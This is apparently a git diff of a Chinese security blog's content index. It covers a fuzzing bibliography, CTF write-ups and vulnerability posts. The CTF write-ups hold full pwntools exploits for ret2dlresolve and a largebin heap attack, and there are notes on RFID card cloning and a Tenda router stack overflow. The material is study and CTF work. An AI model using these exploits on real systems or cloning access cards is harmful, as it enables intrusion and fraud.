Software vulnerability discovery techniques: A survey. In: Multimedia Information Networking and Security (MINES), 2012 Fourth International Conference on. IEEE, Nanjing. pp 152–156. <a class="link"   href="https://doi/" >https://doi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. org&#x2F;10.1109&#x2F;MINES.2012.202<br>Luk C-K, Cohn R, Muth R, Patil H, Klauser A, Lowney G, Wallace S, Reddi VJ, Hazelwood K (2005) Pin: building customized program analysis tools with dynamic instrumentation. In: Acm sigplan notices, volume 40. ACM, Chicago. pp 190–200<br>Nichols N, Raugas M, Jasper R, Hilliard N (2017) Faster fuzzing: Reinitialization with deep neural models. arXiv preprint arXiv:1711.02807<br>PeachTech (2017) Peach. <a class="link"   href="https://www.peach.tech/" >https://www.peach.tech/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017 Petsios T, Zhao J, Keromytis AD, Jana S (2017) Slowfuzz: Automated<br>domain-independent detection of algorithmic complexity vulnerabilities. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York.<br>pp 2155–2168. <a class="link"   href="https://doi.org/10.1145/3133956.3134073" >https://doi.org/10.1145/3133956.3134073 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Rajpal M, Blum W, Singh R (2017) Not all bytes are equal: Neural byte sieve for fuzzing. arXiv preprint arXiv:1711.04596<br>Rawat S, Jain V, Kumar A, Cojocar L, Giuffrida C, Bos H (2017) Vuzzer: Application-aware evolutionary fuzzing. In: Proceedings of the Network and Distributed System Security Symposium (NDSS). <a class="link"   href="https://www.vusec/" >https://www.vusec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. net&#x2F;download&#x2F;?t&#x3D;papers&#x2F;vuzzer_ndss17.pdf Schumilo S, Aschermann C, Gawlik R, Schinzel S, Holz T (2017) kAFL: Hardware-assisted feedback fuzzing for OS kernels. In: Kirda E, Ristenpart T (eds). 26th USENIX Security Symposium, USENIX Security 2017. USENIX Association, Vancouver. pp 167–182<br>Serebryany K, Bruening D, Potapenko A, Vyukov D (2012) Addresssanitizer: A fast address sanity checker. In: Proceeding USENIX ATC’12 Proceedings of the 2012 USENIX conference on Annual Technical Conference. USENIX Association, Berkeley. pp 309–318<br>Serebryany K, Iskhodzhanov T (2009) Threadsanitizer: data race detection in practice. In: Proceedings of the Workshop on Binary Instrumentation and Applications. pp 62–71<br>Shirey RW (2000) Internet security glossary. <a class="link"   href="https://tools.ietf.org/html/rfc2828" >https://tools.ietf.org/html/rfc2828 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Stephenfewer (2016) Grinder. <a class="link"   href="https://github.com/stephenfewer/grinder" >https://github.com/stephenfewer/grinder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Stephens N, Grosen J, Salls C, Dutcher A, Wang R, Corbetta J, Shoshitaishvili Y, Kruegel C, Vigna G (2016) Driller: Augmenting fuzzing through selective symbolic execution. In: NDSS, volume 16, San Diego. pp 1–16<br>Sutton M, Greene A, Amini P (2007) Fuzzing: brute force vulnerability discovery. Pearson Education, Upper Saddle River<br>Takanen A, Demott JD, Miller C (2008) Fuzzing for software security testing and quality assurance. Artech House<br>The Clang Team (2017) Dataflowsanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>DataFlowSanitizerDesign.html. Accessed 25 Dec 2017<br>The Clang Team (2017) Leaksanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>LeakSanitizer.html. Accessed 25 Dec 2017<br>Van Sprundel I (2005) Fuzzing: Breaking software in an automated fashion. Decmember 8th<br>Vyukov D (2015) Syzkaller. <a class="link"   href="https://github.com/google/syzkaller" >https://github.com/google/syzkaller <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Wang J, Chen B, Wei L, Liu Y (2017) Skyfire: Data-driven seed generation for fuzzing. In: Security and Privacy (SP), 2017 IEEE Symposium on. IEEE, San Jose. <a class="link"   href="https://doi.org/10.1109/SP.2017.23" >https://doi.org/10.1109/SP.2017.23 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Wang S, Nam J, Tan L (2017) Qtep: quality-aware test case prioritization. In: Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering. ACM, New York. pp 523–534. <a class="link"   href="https://doi.org/10.1145/" >https://doi.org/10.1145/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>3106237.3106258<br>Wang T, Wei T, Gu G, Zou W (2010) Taintscope: A checksum-aware directed fuzzing tool for automatic software vulnerability detection. In: Security and privacy (SP) 2010 IEEE symposium on. IEEE, Berkeley. pp 497–512. https:&#x2F;&#x2F; <a class="link"   href="http://doi.org/10.1109/SP.2010.37" >doi.org&#x2F;10.1109&#x2F;SP.2010.37 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Wichmann BA, Canning AA, Clutterbuck DL, Winsborrow LA, Ward NJ, Marsh DWR (1995) Industrial perspective on static analysis. Softw Eng J 10(2):69–75<br>Wikipedia, Wannacry ransomware attack (2017). <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>WannaCry_ransomware_attack. Accessed 25 Dec 2017<br>Wikipedia (2017) Dynamic program analysis. <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Dynamic_program_analysis. Accessed 25 Dec 2017<br>Wu Z-Y, Wang H-C, Sun L-C, Pan Z-L, Liu J-J (2010) Survey of fuzzing. Appl Res Comput 27(3):829–832<br>Xu W, Kashyap S, Min C, Kim T (2017) Designing new operating primitives to improve fuzzing performance. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2313–2328. <a class="link"   href="https://doi.org/10.1145/3133956" >https://doi.org/10.1145/3133956 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. 3134046<br>Yang Q, Li JJ, Weiss DM (2007) A survey of coverage-based testing tools. The Computer Journal 52(5):589–597<br>Zalewski, M (2017) American fuzzy lop. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Zalewski M (2017) Afl technical details. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>technical_details.txt. Accessed 25 Dec 2017<br>Zimmer D (2013) Comraider. <a class="link"   href="http://sandsprite.com/tools.php?id=16" >http://sandsprite.com/tools.php?id=16 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>translate：CataLpa</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>家用路由器固件常用解包方法 &amp; D-Link DIR-878 BUGS</title>
@@ -5357,6 +5371,9 @@
 <p>虽然正则过滤掉了一部分危险输入(主要是空格符)，但是我们可以利用多种办法来绕过空格符的过滤，由于这个 API 接口除了 tbsCheckHttpUrl 处理 URL 之外就没有其他防护了，绕过过滤之后依然可执行任意 shell 命令。</p>
 <p>拿到交互式的 shell 之后即可上传一份调试器，再去调试固件就方便多了。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>CNVD-2018-01084 漏洞复现</title>
@@ -5521,6 +5538,9 @@
 
 <p>大家可以自行编译运行查看结果。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>二进制文件应急修复</title>
@@ -5619,12 +5639,14 @@
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Patch binary 的时候要注意不能使文件体积变动过大，否则很容易被判宕机，另外，针对不同的漏洞有不同的修复手段，但是总体上来看就是添加、删除代码的过程。patch 过程中注意不要破坏原有的功能（特别是堆栈、寄存器等运行环境），防止 check 不过，当遇到比较复杂的漏洞或者文件空间不足等情况，应该考虑使用如 LIEF 等工具直接替换整个函数。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>Ret2 runtime_dlresolve</title>
     <url>/2019/05/02/Ret2runtime_dlresolve/</url>
-    <content><![CDATA[<p>Update: 2020-11-10</p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Ret2dlresolve 是高级 ROP 技巧之一，世界著名的黑客杂志 phrack 在某一期提到过这个攻击技巧，该手段用于没有较好的 gadget、函数、利用链的情况。ret2dlresolve 主要利用了 linux 下的延迟绑定机制，通过修改解析字符串，我们就可以控制最终解析出的函数，从而获取任意函数执行的能力。</p>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Ret2dlresolve 是高级 ROP 技巧之一，世界著名的黑客杂志 phrack 在某一期提到过这个攻击技巧，该手段用于没有较好的 gadget、函数、利用链的情况。ret2dlresolve 主要利用了 linux 下的延迟绑定机制，通过修改解析字符串，我们就可以控制最终解析出的函数，从而获取任意函数执行的能力。</p>
 <span id="more"></span>
 
 <h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>这一攻击技巧的基础就是linux下的延迟绑定机制，所以首先我们来了解一下什么是延迟绑定。</p>
@@ -5740,6 +5762,9 @@
 <p>针对这道题，先依照官方的例子得到 payload，但是在执行 system 函数的时候发现由于 env 参数不为 0，会导致执行失败，所以将输出的 payload 中占位的字节改成 \x00 即可。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./readme2&quot;</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line">payload = <span class="string">&quot;6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d616161608304085a8504080000000000ae040840830408182b00006761616120ae0408000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073797374656d0061a82b000000000000000000000000000000ae040807c302002f62696e2f736800&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>DDCTF 2019</title>
@@ -5920,9 +5945,12 @@
 <p>仔细观察图片发现 2 号线魏公村点点颜色比较深，用字符串 weigongcun 作为密钥在线解密得到 flag</p>
 <p>DDCTF{Q*2!x@B0}</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>Largebin attack [archived]</title>
+    <title>Largebin attack</title>
     <url>/2019/04/18/largebin_attack/</url>
     <content><![CDATA[<p>最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。</p>
 <span id="more"></span>
@@ -6054,13 +6082,17 @@
 <h2 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Storm_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># 后向合并,构造第一个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># 后向合并,构造第二个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>RFID 安全初探</title>
     <url>/2019/03/26/RFID/</url>
-    <content><![CDATA[<h2 id="RFID-简介"><a href="#RFID-简介" class="headerlink" title="RFID 简介"></a>RFID 简介</h2><p>RFID(Radio Frequency Identification) 全称射频识别技术，这个名字大家可能比较陌生，但是提起我们生活中经常使用的饭卡，水卡，银行卡等等这些东西，大家应该很熟悉了。我们几乎每天都会使用这些小小的卡片，吃饭需要，取钱需要，甚至回家使用电梯也需要，可以说我们的生活已经离不开 RFID 这一技术了。</p>
+    <content><![CDATA[<p>RFID 相关内容。</p>
 <span id="more"></span>
 
+<h2 id="RFID-简介"><a href="#RFID-简介" class="headerlink" title="RFID 简介"></a>RFID 简介</h2><p>RFID(Radio Frequency Identification) 全称射频识别技术，这个名字大家可能比较陌生，但是提起我们生活中经常使用的饭卡，水卡，银行卡等等这些东西，大家应该很熟悉了。我们几乎每天都会使用这些小小的卡片，吃饭需要，取钱需要，甚至回家使用电梯也需要，可以说我们的生活已经离不开 RFID 这一技术了。</p>
 <p>那么 RFID 到底是怎样的一门技术？针对它的攻防又会如何展开呢？这次我们就来简单探索一下关于 RFID 射频识别的攻与防。</p>
 <p>首先要知道什么是 RFID，实际上它是一种自动识别技术，同一类的还包括条形码识别，OCR 等等，与 RFID 最为相关的就是智能卡(又称作<strong>电子标签</strong>)了，我们日常生活中用到的各种卡片大多数都属于智能卡，它们的构造很简单，从外观来看就是普通的塑料卡片，如果我们将卡片放在强光下照射，从另一面就能够清晰的看到卡片内部构造，首先是很多圈铜线绕成的线圈，这个线圈各种形状都有，但是以正方形，圆形和椭圆为主，在线圈中央存在一个非常小的芯片，一个 RFID 内部可能是下面这种形态</p>
 <p><img  
@@ -6182,24 +6214,25 @@
 <p>取出的数据和原始卡片也是相同的！经测试复制卡能够正常通过门禁闸机，<strong>没有对消费进行测试!</strong></p>
 <p><strong>RFID 仅为技术研究，请不要执行非法操作！</strong></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
-    <title>CVE-2018-5767 复现分析</title>
+    <title>CVE-2018-5767</title>
     <url>/2019/03/19/CVE-2018-5767/</url>
-    <content><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><strong>0x01</strong></h2><p>CVE-2018-5767 是 TENDA-AC15 型号路由器上的一个漏洞，产生的原因是没有限制用户的输入，使用函数 sscanf 直接将输入拷贝到栈上，导致栈溢出，可以修改返回地址，进而远程执行代码。</p>
-<p>存在该漏洞的固件是Tenda cn Ac15_firmware:15.03.1.16</p>
+    <content><![CDATA[<p>CVE-2018-5767 是 TENDA-AC15 型号路由器上的一个漏洞，产生的原因是没有限制用户的输入，使用函数 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p>
+<p>存在该漏洞的固件是 Tenda cn Ac15_firmware:15.03.1.16</p>
 <span id="more"></span>
 
-<h2 id="0x02-抽取固件"><a href="#0x02-抽取固件" class="headerlink" title="0x02 抽取固件"></a><strong>0x02 抽取固件</strong></h2><p>要想分析漏洞，首先就要拿到路由器的固件，如果你手边恰好有一台TENDA-AC15 路由器的话，可以去网上找找怎样从硬件上提取固件(我这么穷当然没有路由器了。。。)，但是更为简单经济的方法是去官网下载相应版本的固件，在电脑上抽取有关文件。</p>
-<p>首先需要明确一点，IoT 设备的系统和平时常用的 linux、Windows 系统不同，由于设备的特殊性质，它更加类似于单片机，操作系统比较简单，而且许多 IOT 设备使用的都是一些不是很常见的指令集(多数使用了精简指令集)，这就需要我们了解这些 CPU 架构以及指令集的特性，才能分析固件中的程序。</p>
-<p>幸运的是，TENDA(至少是 AC15)的 CPU 是 ARM 架构的，抽取的程序可以直接使用 IDA 进行反编译，暂时无需对着一大片汇编代码头疼了。</p>
+<h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p>首先需要明确一点，IoT 设备的系统通常与 linux、Windows 不同，由于设备的资源有限，它们的操作系统相对比较简洁，而且许多 IOT 设备使用的都是一些不是很常见的指令集(多数使用了精简指令集)，这就需要我们了解这些 CPU 架构以及指令集的特性，才能分析固件中的程序。</p>
+<p>幸运的是，TENDA(至少是 AC15)的 CPU 是 ARM 架构的，提取的程序可以直接使用 IDA 进行反编译。</p>
 <p>首先要下载官方的路由器软件包，打开TENDA 的官网，在里面找到 AC15 路由器的支持页面下载固件，<a class="link"   href="https://www.tenda.com.cn/product/support/AC15.html" >链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
-<p>注意不要下载了错误的固件，因为新版本可能已经修复了这个漏洞。</p>
-<p>下载到本地的是一个.bin 文件，大小约为 10 MB，拉到 linux 里面 file 一下发现这其实是一个迷你的镜像</p>
+<p>下载到本地的是一个.bin 文件，大小约为 10 MB，file 一下发现这其实是一个迷你的镜像</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop file US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin </span><br><span class="line">US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin: u-boot legacy uImage, \002, Linux/ARM, OS Kernel Image (lzma), 10227712 bytes, Thu Nov 19 09:36:45 2015, Load Address: 0x80000000, Entry Point: 0xC0008000, Header CRC: 0x73CF0D74, Data CRC: 0x3321F349</span><br></pre></td></tr></table></figure></div>
 
 <p>file 指出它是 u-boot legacy uImage 格式的镜像文件，在百度上可以找到一些详细的解释，简单来说，它就是 Linux 为 ARM 架构打造的小型启动镜像，我们可以将它理解为类似于 IOS 的镜像。</p>
-<p>既然是镜像，就能够通过一些手段来抽取它内部的文件，首先明确此镜像的文件系统格式，通常可以使用binwalk ，以这个固件为例，用 binwalk 跑一下得到的信息：</p>
+<p>既然是镜像，就能够通过一些手段来提取它内部的文件，首先明确此镜像的文件系统格式，通常可以使用 binwalk ，以这个固件为例，用 binwalk 跑一下得到的信息：</p>
  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">\--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            TRX firmware header, little endian, image size: 10227712 bytes, CRC32: 0x314DBDAC, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x198CDC, rootfs offset: 0x0</span><br><span class="line">92            0x5C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4114848 bytes</span><br><span class="line">1674524       0x198D1C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: 2015-11-19 09:36:43 </span><br></pre></td></tr></table></figure></div>
 
 <p>第三项指出了镜像的文件系统格式为Squashfs，类似的文件格式还有许多，一般都能被 binwalk 所识别。</p>
@@ -6208,16 +6241,15 @@
 
 <p>if 参数设置输入的文件，bs 是输入输出块的大小，count 是输入输出块的个数(抽取的总字节数可以理解为 bs * count)，skip 是从文件头开始的偏移量，of 指定输出字节的保存位置，这些数据在 binwalk 中都能找到。</p>
 <p>执行这条命令需要比较长的时间，跑完得到一个名为image 的文件，这时再来 file 一下</p>
-<p>image: Squashfs filesystem, little endian, version 4.0, 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: Thu Nov 19 09:36:43 2015</p>
-<p>文件系统已经抽取出来了，接下来就是解压出文件，和NTFS FAT32 类似，Squashfs 是一种磁盘格式，可以直接使用来工具解码文件，这里我们用到的工具是 squashfs-tools，在 github 上面能找到源代码，也可以使用下面的命令直接安装</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">./configure</span><br><span class="line">make </span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">image: Squashfs filesystem, little endian, version 4.0, 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: Thu Nov 19 09:36:43 2015</span><br></pre></td></tr></table></figure></div>
+
+<p>文件系统已经提取出来了，接下来就是解压出文件，和 NTFS FAT32 类似，Squashfs 是一种磁盘格式，可以直接使用来工具解码文件，这里我们用到的工具是 squashfs-tools，在 github 上面能找到源代码，也可以使用下面的命令直接安装</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">./configure</span><br><span class="line">make </span><br></pre></td></tr></table></figure></div>
 
 <p>然后找到工具中的unsquashfs_all.sh，使用下面的命令解压镜像</p>
 <p>unsquashfs_all.sh image </p>
-<p><strong>注：解压出的文件保存在squashfs-root 文件夹中</strong></p>
 <p>到这里，路由器的固件已经被提取出来了，下面准备复现漏洞。</p>
-<p>PS： 实际上还有一种更加简单的方法来抽取固件，直接用 binwalk -Me  就可以了，但是在面对某些文件系统的时候可能不大好用，所以常备一个专业的工具(firmware-mod-kit)，还是很有必要的。</p>
-<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a><strong>0x03 漏洞分析</strong></h2><p>在bin 文件夹中找到存在漏洞的文件 httpd ，使用 checksec 看一下开启的保护：</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在bin 文件夹中找到存在漏洞的文件 httpd ，使用 checksec 看一下开启的保护：</p>
 <p> <img  
                      lazyload
                      src="/images/loading.svg"
@@ -6237,7 +6269,7 @@
 
 <p>很明显这里是存在栈溢出的，代码没有判断字段的最大长度，直接将内容拷贝到栈上，如果用户精心构造一个password，那么可能有机会控制整个程序的流程，进而达到远程执行代码的目的。</p>
 <p>在复现漏洞的时候经常会摸不到头脑，比如凭什么说v22 + 46 代表 http 请求，这个函数究竟想要干什么等等，加上没有真正的路由器，一切只能在 qemu 中模拟，想要真正从根本上理解漏洞的成因是比较困难的，解决办法只能是不断地分析关键函数并且根据程序功能猜测这些究竟是什么，有条件的话可以考虑搞来一台路由器模拟真实的环境，这或许能够解决一部分问题。</p>
-<h2 id="0x04-搭建调试环境"><a href="#0x04-搭建调试环境" class="headerlink" title="0x04 搭建调试环境"></a><strong>0x04 搭建调试环境</strong></h2><p><strong>操作之前先拍摄快照！</strong></p>
+<h2 id="搭建调试环境"><a href="#搭建调试环境" class="headerlink" title="搭建调试环境"></a>搭建调试环境</h2><p><strong>操作之前先拍摄快照！</strong></p>
 <p>在从前，想要跨平台模拟运行其他平台的程序是很困难的，幸好一路大佬开发出了QEMU，关于 QEMU 的具体信息可在其官方网站上找到，实际上它就是一个虚拟机，能够虚拟大部分硬件设备，ARM 自然也包括在内，下面是一张关于 QEMU 的简图</p>
 <p> <img  
                      lazyload
@@ -6262,9 +6294,10 @@
 <p>sudo apt-get install gdb-multiarch </p>
 <p>安装完成之后启动看看是否正常，推荐装上pwndbg 这个 gdb 插件，方便调试。</p>
 <p>如果一切正常，下面就可以开始调试了，首先使用qemu 将程序跑起来</p>
-<p>qemu-arm-static -g 1234 -L &lt;抽取出的固件根目录&gt; httpd</p>
